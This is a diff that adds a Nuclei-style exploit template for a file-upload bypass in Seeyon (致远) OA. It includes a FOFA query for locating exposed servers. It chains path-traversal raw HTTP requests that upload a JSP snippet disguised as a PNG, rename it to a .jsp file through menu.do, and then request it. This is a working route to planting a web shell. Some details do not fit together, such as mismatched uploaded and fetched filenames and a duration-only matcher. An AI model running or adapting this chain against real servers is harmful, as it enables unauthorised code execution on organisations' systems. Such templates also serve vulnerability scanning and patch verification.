@@ -1,0 +1,70 @@
+id: NPoc-18
+
+info:
+  name: 致远OAfileUpload.do前台文件上传绕过漏洞
+  author: kingkong
+  severity: high
+  metadata:
+    fofa-query: app="FE-协作平台" || title="协同管理软件 V5.6SP1"
+
+request:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Type: multipart/form-data; boundary=skdHHhNHjhnUgerSexsksboundary
+        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="type"
+          
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="extensions"
+          
+        png
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="applicationCategory"
+          
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="destDirectory"
+          
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="destFilename"
+          
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="maxSize"
+          
+          
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="isEncrypt"
+          
+        false
+        --skdHHhNHjhnUgerSexsksboundary
+        Content-Disposition: form-data; name="file1"; filename="1.png"
+        Content-Type: Content-Type: application/pdf
+          
+        <% out.println("hello test");%>
+        --skdHHhNHjhnUgerSexsksboundary--
+      - |
+        POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+        
+        method=uploadMenuIcon&fileid={{id}}&filename=testqqww.jsp
+      - |
+        GET /seeyon/main/menuIcon/a123.jsp HTTP/1.1
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+    matchers-condition: and
+    matchers:
+      - type: duration
+        part: duration
+        duration: 5
